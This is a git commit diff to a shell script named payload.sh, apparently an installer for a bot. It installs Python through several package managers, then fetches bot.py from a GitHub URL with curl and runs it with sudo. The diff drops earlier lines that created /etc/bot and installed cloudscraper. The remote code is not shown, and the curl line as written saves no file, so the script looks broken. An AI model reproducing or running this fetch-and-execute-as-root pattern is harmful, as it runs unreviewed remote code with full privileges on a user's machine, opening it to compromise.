9778fac5968e0b9b3e752f14419da37d57c9ce3f
maearapowre-cmd <maearapowre@gmail.com>
2026-02-28 21:27:59 +0100

    Change curl command to download bot.py
    Updated the curl command to fetch bot.py from a new URL.

--- payload.sh
+++ payload.sh
@@ -1,7 +1,3 @@
 sudo apt install python3 && sudo apt install python && yum install python3 && yum install python && pkg install python3 && pkg install python
-pip install cloudscraper requests && pip3 install cloudscraper requests
-cd /etc
-mkdir bot
-cd /etc/bot
-curl https://github.com/maearapowre-cmd/payload
+curl https://github.com/maearapowre-cmd/bot.py
 sudo python3 bot.py
